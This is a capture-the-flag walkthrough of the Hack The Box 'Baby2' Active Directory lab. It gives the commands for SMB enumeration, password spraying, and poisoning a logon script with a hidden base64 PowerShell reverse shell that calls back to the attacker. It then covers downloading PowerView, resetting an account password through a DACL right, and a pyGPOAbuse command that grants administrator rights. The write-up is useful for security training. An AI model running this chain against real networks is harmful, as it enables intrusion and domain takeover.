---
icon: cat
---

# HTB-BABYTWO (VL)

<figure><img src="../../../../.gitbook/assets/image (490).png" alt=""><figcaption></figcaption></figure>

### Enumeration

#### Network Scanning

We begin with a comprehensive nmap scan to identify all open ports and services:

```bash
nmap -p 1-65535 -T4 -A -v 10.129.234.72
```

OUTPUT&#x20;

```python
 Nmap scan report for 10.129.234.72
 Host is up (0.072s latency).
 Not shown: 65515 filtered tcp ports (no-response)
 PORT      STATE SERVICE       VERSION
 53/tcp    open  domain        Simple DNS Plus
 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-29 
15:03:00Z)
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: 
baby2.vl0., Site: Default-First-Site-Name)
 | ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
 | Issuer: commonName=baby2-CA
 | Public Key type: rsa
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2025-08-19T14:22:11
 | Not valid after:  2105-08-19T14:22:11
 | MD5:   4ef7 774c a979 8d43 b332 cc53 7cb6 41ab
 |_SHA-1: 6cfd 3491 aa6c 4131 52e2 f61e 361f b332 5eec 47ff
 |_ssl-date: TLS randomness does not represent time
 445/tcp   open  microsoft-ds?
 464/tcp   open  kpasswd5?
 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: 
baby2.vl0., Site: Default-First-Site-Name)
 | ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
 | Issuer: commonName=baby2-CA
 | Public Key type: rsa
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2025-08-19T14:22:11
 | Not valid after:  2105-08-19T14:22:11
 | MD5:   4ef7 774c a979 8d43 b332 cc53 7cb6 41ab
 |_SHA-1: 6cfd 3491 aa6c 4131 52e2 f61e 361f b332 5eec 47ff
 |_ssl-date: TLS randomness does not represent time
 3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: 
baby2.vl0., Site: Default-First-Site-Name)
 | ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
 | Issuer: commonName=baby2-CA
 | Public Key type: rsa
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2025-08-19T14:22:11
 | Not valid after:  2105-08-19T14:22:11
 | MD5:   4ef7 774c a979 8d43 b332 cc53 7cb6 41ab
 |_SHA-1: 6cfd 3491 aa6c 4131 52e2 f61e 361f b332 5eec 47ff
 |_ssl-date: TLS randomness does not represent time
 3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: 
baby2.vl0., Site: Default-First-Site-Name)
 | ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
 | Issuer: commonName=baby2-CA
 | Public Key type: rsa
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2025-08-19T14:22:11
 | Not valid after:  2105-08-19T14:22:11
 | MD5:   4ef7 774c a979 8d43 b332 cc53 7cb6 41ab
 |_SHA-1: 6cfd 3491 aa6c 4131 52e2 f61e 361f b332 5eec 47ff
 |_ssl-date: TLS randomness does not represent time
 3389/tcp  open  ms-wbt-server Microsoft Terminal Services
 | rdp-ntlm-info: 
|   Target_Name: BABY2
 |   NetBIOS_Domain_Name: BABY2
 |   NetBIOS_Computer_Name: DC
 |   DNS_Domain_Name: baby2.vl
 |   DNS_Computer_Name: dc.baby2.vl
 |   DNS_Tree_Name: baby2.vl
 |   Product_Version: 10.0.20348
 |_  System_Time: 2025-09-29T15:03:55+00:00
 | ssl-cert: Subject: commonName=dc.baby2.vl
 | Issuer: commonName=dc.baby2.vl
 | Public Key type: rsa
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2025-08-18T14:29:57
 | Not valid after:  2026-02-17T14:29:57
 | MD5:   ae82 599c b589 a1ec 60b7 e83c 50d7 cf06
 |_SHA-1: 1e8a 1ac9 92a1 c502 dd3a 8d88 5341 12a0 828d bbcb
 |_ssl-date: 2025-09-29T15:04:34+00:00; +15s from scanner time.
 9389/tcp  open  mc-nmf        .NET Message Framing
 49664/tcp open  msrpc         Microsoft Windows RPC
 49667/tcp open  msrpc         Microsoft Windows RPC
 49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 49674/tcp open  msrpc         Microsoft Windows RPC
 49679/tcp open  msrpc         Microsoft Windows RPC
 57803/tcp open  msrpc         Microsoft Windows RPC
 59855/tcp open  msrpc         Microsoft Windows RPC
```

**Key Findings:**

**Domain Information Discovered:**

* Domain: baby2.vl
* DNS Domain: baby2.vl
* NetBIOS Domain: BABY2
* Computer Name: DC
* FQDN: dc.baby2.vl

**SSL Certificate Information:**

* Issuer: baby2-CA
* Subject Alternative Names: dc.baby2.vl, baby2.vl, BABY2
* Valid: 2025-08-19 to 2105-08-19

This is clearly a Windows Active Directory Domain Controller running modern Windows Server (version 10.0.20348).

***

### Initial Access

#### SMB Enumeration as Guest

Since we don't have credentials yet, we test guest access to SMB shares:

```bash
smbmap -H 10.129.234.72 -d 'baby2.vl' -u 'GUEST' -p ''
```

**Share Access Results:**

| Share    | Permissions | Description                |
| -------- | ----------- | -------------------------- |
| ADMIN$   | NO ACCESS   | Remote Admin               |
| apps     | READ ONLY   | Application files          |
| C$       | NO ACCESS   | Default share              |
| docs     | NO ACCESS   | Document storage           |
| homes    | READ, WRITE | User home directories      |
| IPC$     | READ ONLY   | Remote IPC                 |
| NETLOGON | READ ONLY   | Logon server share         |
| SYSVOL   | NO ACCESS   | Logon server share (guest) |

#### Recursive SMB Enumeration

We perform a recursive enumeration to discover files and directories:

```bash
smbmap -H 10.129.234.72 -d 'baby2.vl' -u 'GUEST' -p '' -R
```

**Notable Discoveries in 'apps' share:**

* `apps/dev/CHANGELOG` - 108 bytes
* `apps/dev/login.vbs.lnk` - 1800 bytes (shortcut file)

**User Home Directories in 'homes' share:**

* Amelia.Griffiths
* Carl.Moore
* Harry.Shaw
* Joan.Jennings
* Joel.Hurst
* Kieran.Mitchell
* library
* Lynda.Bailey
* Mohammed.Harris
* Nicola.Lamb
* Ryan.Jenkins

This gives us a list of potential usernames for further enumeration.

#### RID Brute Force Enumeration

To discover additional user accounts, we perform RID brute-forcing:

```bash
nxc smb 10.129.234.72 -u 'guest' -p '' --rid-brute
```

We extract usernames from the output:

```bash
nxc smb 10.129.234.72 -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users.txt
```

This creates a comprehensive list of domain users stored in `users.txt`.

#### Password Spraying Attack

Testing the hypothesis that "username = password" (a common weak configuration):

```bash
nxc smb 10.129.234.72 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

**Successful Credentials Discovered:**

* **library:library** ✓
* **Carl.Moore:Carl.Moore** ✓

This is a significant finding - two users with passwords matching their usernames, indicating poor password policies.

***

### Active Directory Enumeration

#### BloodHound Data Collection

With valid credentials, we use BloodHound to map the Active Directory environment:

```bash
bloodhound-python -u 'library' -p 'library' -d 'baby2.vl' -c All -ns 10.129.234.72 --dns-tcp --zip
```

This collects comprehensive AD data including:

* Domain users and groups
* Computer objects
* Trust relationships
* ACL permissions
* Group Policy Objects
* Session information

#### BloodHound Analysis

**Key Findings:**

1. **Carl.Moore** is a member of the **Office** group
2. **Amelia.Griffiths** has an interesting **LoginScript** configured
3. The **GPOADM** service account exists with special GPO management privileges

While examining user accounts in BloodHound, we notice that Amelia.Griffiths has a logon script configured - this is our potential entry point.

***

### SMB Access with Valid Credentials

#### Testing Authenticated Access

We re-enumerate SMB shares with both discovered accounts:

**Carl.Moore Access:**

```bash
smbmap -H 10.129.234.72 -d 'baby2.vl' -u 'Carl.Moore' -p 'Carl.Moore'
```

**library Access:**

```bash
smbmap -H 10.129.234.72 -d 'baby2.vl' -u 'library' -p 'library'
```

**Critical Finding:** Both users have access to the **SYSVOL** share, which guest could not access!

#### SYSVOL Directory Exploration

Connecting to SYSVOL with Carl.Moore:

```bash
smbclient //10.129.234.72/SYSVOL -U Carl.Moore%Carl.Moore
```

Within the SMB session:

```
smb: \> cd baby2.vl\scripts
smb: \baby2.vl\scripts\> ls
```

**Directory Contents:**

* `login.vbs` (992 bytes) - The logon script referenced in BloodHound!

#### Testing Write Permissions

We attempt to upload a test file:

```
smb: \baby2.vl\scripts\> put test
```

**SUCCESS!** We have write access to the scripts directory despite smbmap showing "READ ONLY" at the share level.

#### Understanding the Permission Discrepancy

**Why do we have write access when smbmap shows READ?**

There are two layers of permissions in Windows file shares:

1. **Share Permissions (SMB level)**:
   * Reported by tools like `smbmap`, `smbclient --shares`
   * Controls access to the share itself (Read/Change/Full)
   * SYSVOL showed "READ" at this level
2. **NTFS Permissions (File-system ACLs)**:
   * Per-folder/file rights (Modify, Write, FullControl)
   * Actually determines if you can create/modify files
   * The `\\DC\SYSVOL\baby2.vl\scripts` folder has Modify rights for our user/group

**Is this normal?** No! Production Domain Controllers should lock NTFS permissions on SYSVOL to SYSTEM and GPO admins only. Write access for regular domain users is a **critical misconfiguration** that enables logon-script poisoning and GPO attacks.

***

### Weaponization: Reverse Shell via Login Script

#### Downloading the Original Script

```bash
get login.vbs
```

**Original login.vbs Content:**

```vbscript
Sub MapNetworkShare(sharePath, driveLetter)
    Dim objNetwork
    Set objNetwork = CreateObject("WScript.Network")
    
    ' Check if the drive is already mapped
    Dim mappedDrives
    Set mappedDrives = objNetwork.EnumNetworkDrives
    Dim isMapped
    isMapped = False
    
    For i = 0 To mappedDrives.Count - 1 Step 2
        If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
            isMapped = True
            Exit For
        End If
    Next
    
    If isMapped Then
        objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
    End If
    
    objNetwork.MapNetworkDrive driveLetter & ":", sharePath
    
    If Err.Number = 0 Then
        WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
    Else
        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
    End If
    
    Set objNetwork = Nothing
End Sub

' Map drives
MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"
```

This script maps network drives when Amelia.Griffiths logs in.

#### Creating Malicious Payload

We generate a PowerShell reverse shell payload using [RevShells.com](https://www.revshells.com/):

**Configuration:**

* Attack IP: 10.10.16.xx (your IP)
* Port: 4444
* Shell Type: PowerShell #3 (Base64 encoded)

**Modified login.vbs:**

```vbscript
Sub MapNetworkShare(sharePath, driveLetter)
    Dim objNetwork
    Set objNetwork = CreateObject("WScript.Network")
    
    ' Check if the drive is already mapped
    Dim mappedDrives
    Set mappedDrives = objNetwork.EnumNetworkDrives
    Dim isMapped
    isMapped = False
    
    For i = 0 To mappedDrives.Count - 1 Step 2
        If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
            isMapped = True
            Exit For
        End If
    Next
    
    If isMapped Then
        objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
    End If
    
    objNetwork.MapNetworkDrive driveLetter & ":", sharePath
    
    If Err.Number = 0 Then
        WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
    Else
        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
    End If
    
    Set objNetwork = Nothing
End Sub

' Map drives
MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"

' Run PowerShell payload
Dim objShell
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGU..." , 0, False
Set objShell = Nothing
```

The added section creates a WScript.Shell object and executes our base64-encoded PowerShell reverse shell with:

* Window style 0 (hidden)
* False (don't wait for completion)

#### Uploading Malicious Script

Back in the SMB session:

```
smb: \baby2.vl\scripts\> put login.vbs
```

#### Setting Up Listener

```bash
rlwrap nc -lvnp 4444
```

#### Waiting for Execution

Login scripts execute when users log in. In enterprise environments, users log in:

* At the start of their workday
* After screen lock timeouts
* During scheduled tasks or automated processes

**After approximately 1 minute**, we receive a reverse shell as **Amelia.Griffiths**!

***

### User Flag

With shell access as Amelia.Griffiths:

```powershell
type c:\user.txt
```

**Note:** The user flag for this machine is located in a non-standard location: `C:\user.txt` (not in the user's home directory).

**Flag captured!**

***

### Privilege Escalation Path

#### Analyzing Amelia.Griffiths Permissions

From our BloodHound enumeration, we know that **Amelia.Griffiths** has:

1. **WriteOwner** permission on the **GPOADM** user object
2. **WriteDACL** permission on the **GPOADM** user object
3. **WriteOwner** and **WriteDACL** on the **GPO-Management** OU

These permissions allow us to:

* Change the owner of the GPOADM account
* Modify the Discretionary Access Control List (DACL) of GPOADM
* Grant ourselves full control over the GPOADM account
* Reset the GPOADM password

#### Why is GPOADM Important?

The **GPOADM** (Group Policy Administrator) account has **GenericAll** permissions on critical Group Policy Objects (GPOs).

**What GenericAll Means:**

`GenericAll` is the highest-level permission on an Active Directory object, granting complete control. For a GPO specifically, it allows:

* Read, modify, and delete the GPO
* Edit GPO settings and files stored in SYSVOL
* Add or modify scripts, preferences, scheduled tasks
* Change GPO ACLs or ownership
* Apply policies to target computers/users

With GenericAll on a GPO, we can inject malicious configurations that will be executed by domain systems.

***

### Lateral Movement to GPOADM

#### Setting Up PowerView

Since we don't have Amelia's password (we only have a shell), we can't use remote tools like Bloody AD. We'll use **PowerView** directly on the target.

**Host PowerView on attack machine:**

```bash
python3 -m http.server 80
```

**Download to target from our shell:**

```powershell
cd C:\Users\Amelia.Griffiths\Desktop
curl http://10.10.16.xx/PowerView.ps1 -outfile PowerView.ps1
```

**Import PowerView:**

```powershell
. .\PowerView.ps1
```

#### Granting Full Rights to GPOADM

Using PowerView, we grant Amelia.Griffiths full control over the GPOADM object:

```powershell
Add-DomainObjectAcl -Rights all -TargetIdentity GPOADM -PrincipalIdentity Amelia.Griffiths
```

This modifies the DACL on GPOADM to give us complete control.

#### Resetting GPOADM Password

**Create a secure credential:**

```powershell
$cred = ConvertTo-SecureString 'pa$$w0rd' -AsPlainText -Force
```

**Reset the password:**

```powershell
Set-DomainUserPassword GPOADM -AccountPassword $cred
```

The password for GPOADM is now `pa$$w0rd`.

#### Confirming Password Change

```bash
nxc smb 10.129.234.72 -u 'GPOADM' -p 'pa$$w0rd' --users
```

**Success!** The password change is confirmed - we can now authenticate as GPOADM.

***

### Privilege Escalation via GPO Abuse

#### Understanding the Attack Vector

The GPOADM account has **GenericAll** permissions on two Group Policy Objects. We'll exploit this to add GPOADM to the local Administrators group using automated GPO modification.

#### Using pyGPOAbuse

**What is pyGPOAbuse?**

`pyGPOAbuse` is a post-compromise tool that automates the abuse of Group Policy Objects for code execution and persistence. It:

* Modifies GPO content (scripts, scheduled tasks, registry settings)
* Injects commands that execute when the GPO applies
* Provides an easy interface for GPO weaponization

**Clone the repository:**

```bash
git clone https://github.com/Hackndo/pyGPOAbuse.git
cd pyGPOAbuse
```

#### Identifying Target GPO

From BloodHound analysis, we note the GPO ID we want to abuse:

* **GPO ID**: `31B2F340-016D-11D2-945F-00C04FB984F9`

This is likely a default GPO applied domain-wide or to high-value targets.

#### Preparing the Attack

**Update hosts file for proper resolution:**

```bash
nxc smb 10.129.234.72 -u 'GPOADM' -p 'pa$$w0rd' --generate-hosts-file /etc/hosts
```

This ensures our attack tools can properly resolve domain names.

#### Executing GPO Abuse

```bash
python3 pygpoabuse.py baby2.vl/GPOADM:'pa$$w0rd' \
  -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 \
  -command 'net localgroup administrators GPOADM /add' \
  -f
```

**Command Breakdown:**

* Domain credentials: `baby2.vl/GPOADM:pa$$w0rd`
* Target GPO: `31B2F340-016D-11D2-945F-00C04FB984F9`
* Injected command: `net localgroup administrators GPOADM /add`
* `-f` flag: Force modification

This modifies the GPO to execute `net localgroup administrators GPOADM /add` when it applies, adding GPOADM to the local Administrators group.

#### Waiting for GPO Application

Group Policy refresh intervals:

* Default: Every 90-120 minutes (randomized)
* Domain Controllers: Every 5 minutes
* Manual: `gpupdate /force`

**After 1-2 minutes**, we verify the change:

```bash
net localgroup Administrators
```

**GPOADM has been added to Administrators!** 🎯

***

### Root Access

#### Connecting as Administrator

Using Evil-WinRM to connect with our newly privileged account:

```bash
evil-winrm -i 10.129.234.72 -u 'baby2.vl\GPOADM' -p 'pa$$w0rd'
```

We now have an administrative PowerShell session!

#### Capturing Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

**Root flag captured!** 🚩

***

### Attack Chain Summary

```
1. Guest SMB Access
   ↓
2. User Enumeration (RID Brute Force)
   ↓
3. Password Spraying (username=password)
   ↓
4. Valid Credentials: library:library, Carl.Moore:Carl.Moore
   ↓
5. BloodHound Enumeration
   ↓
6. Identify Writable SYSVOL/scripts directory
   ↓
7. Identify Amelia.Griffiths login script
   ↓
8. Inject Reverse Shell into login.vbs
   ↓
9. Shell as Amelia.Griffiths
   ↓
10. Identify WriteOwner/WriteDACL on GPOADM
    ↓
11. Use PowerView to grant full rights
    ↓
12. Reset GPOADM password
    ↓
13. Authenticate as GPOADM
    ↓
14. Identify GenericAll on GPO
    ↓
15. Use pyGPOAbuse to add GPOADM to Administrators
    ↓
16. Evil-WinRM as Administrator
    ↓
17. Root Flag
```

***

<figure><img src="../../../../.gitbook/assets/complete (35).gif" alt=""><figcaption></figcaption></figure>
